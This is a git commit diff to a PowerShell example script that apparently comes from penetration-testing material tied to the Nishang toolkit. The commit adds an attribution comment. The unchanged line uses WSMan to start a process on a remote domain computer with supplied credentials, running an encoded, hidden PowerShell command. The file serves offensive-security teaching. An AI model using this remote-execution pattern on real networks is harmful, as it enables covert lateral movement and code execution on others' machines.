9411be45ae920a3ea51a13132259baa981013dc6
ahhh <ahhh.db@gmail.com>
2016-03-06 10:22:52 -0800

    Update ex_RemotingRevisited.ps1

--- ex_RemotingRevisited.ps1
+++ ex_RemotingRevisited.ps1
@@ -1,2 +1,3 @@
-﻿#Use Invoke-Encode from Nishang to encode a command or script.
+# Example by Nikhil Mittal : http://www.labofapenetrationtester.com/
+# Use Invoke-Encode from Nishang to encode a command or script.
 Invoke-WSManAction -Action Create -ResourceURI wmicimv2/win32_process -ValueSet @{commandline="powershell.exe -e S08t0Q0oyk9OLS7m5QIA"} -ComputerName domainpc –Credential bharat\domainuser
